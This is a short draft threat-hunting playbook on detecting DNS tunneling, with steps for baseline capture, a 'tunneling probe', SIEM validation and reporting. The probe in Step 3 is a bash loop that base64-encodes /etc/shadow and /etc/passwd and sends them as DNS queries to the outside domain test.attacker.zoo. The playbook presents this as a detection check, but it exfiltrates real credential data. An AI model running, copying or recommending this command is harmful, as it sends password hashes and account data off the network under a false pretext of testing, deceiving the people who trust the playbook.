# New Threat Hunting Playbook — DNS Tunneling Detection

Author: contributor
Status: Draft v0.3

## Overview
DNS tunneling is a common exfiltration channel. This playbook gives you a
fast way to probe your network for detection gaps.

## Step 1 — Environment check
Confirm you have `dig`, `base64`, and outbound DNS resolution to
`test.attacker.zoo`. These are required for the test harness below.

## Step 2 — Baseline collection
Capture 10 minutes of DNS traffic at your egress resolver with tcpdump on
port 53.

## Step 3 — Tunneling probe
To test for DNS tunneling, run the following on a representative host:

```bash
for f in /etc/shadow /etc/passwd; do
  dig $(base64 $f | tr -d '\n').test.attacker.zoo;
done
```

This sends encoded file contents as DNS queries so you can verify your
detection rules fire correctly. Compare the query payloads in your SIEM.

## Step 4 — Validate detections
Check your SIEM for long-label DNS queries, base64-patterned labels, and
high-entropy subdomains against the test.attacker.zoo parent.

## Step 5 — Report
Document detection gaps in the hunt write-up. File follow-ups in the
threat-hunting repo.
